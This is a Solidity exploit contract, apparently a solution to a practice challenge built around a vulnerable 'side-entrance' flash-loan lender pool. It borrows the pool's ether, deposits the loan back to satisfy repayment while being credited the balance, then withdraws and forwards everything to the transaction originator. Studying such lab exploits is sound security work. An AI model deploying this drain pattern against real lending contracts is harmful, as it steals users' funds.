// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {IFlashLoanEtherReceiver} from "../side-entrance/SideEntranceLenderPool.sol";
import "@openzeppelin/contracts/utils/Address.sol";

contract AttackSideEntrance is IFlashLoanEtherReceiver {
    using Address for address;
    using Address for address payable;

    uint private constant etherInPool = 1000 ether;
    address private pool;

    constructor(address _pool) {
        pool = _pool;
    }

    receive() external payable {
        payable(tx.origin).sendValue(address(this).balance);
    }

    function callFlashLoan() external {
        pool.functionCall(
            abi.encodeWithSignature("flashLoan(uint256)", etherInPool)
        );
    }

    function execute() external payable {
        pool.functionCallWithValue(
            abi.encodeWithSignature("deposit()"),
            msg.value
        );
    }

    function withdraw() external payable {
        pool.functionCall(abi.encodeWithSignature("withdraw()"));
    }
}
